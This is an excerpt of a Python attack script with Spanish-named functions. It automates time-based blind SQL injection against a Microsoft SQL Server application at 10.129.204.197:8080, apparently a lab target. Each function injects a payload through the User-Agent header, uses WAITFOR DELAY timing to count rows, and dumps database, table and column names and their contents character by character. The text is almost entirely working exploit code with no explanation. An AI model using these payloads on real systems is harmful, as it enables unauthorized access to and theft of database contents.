...
def count_rows(payload,i,n_columns):
	if evento.is_set():
		return
	headers = {"User-Agent":f"'; if(({payload})={i}) WAITFOR DELAY '00:00:05';--"}
	respuesta = requests.get(f"http://10.129.204.197:8080/",headers=headers)
	if respuesta.elapsed.total_seconds() > 5 and respuesta.elapsed.total_seconds() < 6.5:
		n_columns.append(i)
		evento.set()
...
def n_caracteres(payload1,i,j,resultados):
	if evento.is_set():
		return
	headers = {"User-Agent":f"'; if(({payload1} offset {i} rows fetch next 1 rows only)={j}) WAITFOR DELAY '00:00:05';--"}
	respuesta = requests.get(f"http://10.129.204.197:8080/",headers=headers)
	if respuesta.elapsed.total_seconds() > 5 and respuesta.elapsed.total_seconds() < 6.5:
		evento.set()
		resultados.append(j)
...
def dumpear(i,j,k,chars_string,name_db,name_tb,name_column,initial_1):
	if evento.is_set():
		return
	if initial_1 == 'T':
		headers = {"User-Agent":f"'; if((select substring(table_name,{j},1) from information_schema.tables where table_catalog= '{name_db}' order by table_name offset {i} rows fetch next 1 rows only)='{k}') WAITFOR DELAY '00:00:05';--"}
		respuesta = requests.get(f"http://10.129.204.197:8080/",headers=headers)
	if initial_1 == 'B':
		headers = {"User-Agent":f"'; if((select substring(name,{j},1) from sys.databases order by name offset {i} rows fetch next 1 rows only)='{k}') WAITFOR DELAY '00:00:05';--"}
		respuesta = requests.get(f"http://10.129.204.197:8080/",headers=headers)
	if initial_1 == 'C':
		headers = {"User-Agent":f"'; if((select substring(column_name,{j},1) from information_schema.columns where table_name = '{name_tb}' order by column_name offset {i} rows fetch next 1 rows only)='{k}') WAITFOR DELAY '00:00:05';--"}
		respuesta = requests.get(f"http://10.129.204.197:8080/",headers=headers)
	if initial_1 == 'D':
		headers = {"User-Agent": f"'; if((select substring({name_column},{j},1) from {name_tb} order by {name_column} offset {i} rows fetch next 1 rows only)='{k}') WAITFOR DELAY '00:00:05';--"}
		respuesta = requests.get(f"http://10.129.204.197:8080/",headers=headers)
	if respuesta.elapsed.total_seconds() > 5 and respuesta.elapsed.total_seconds() < 6.5:
		evento.set()
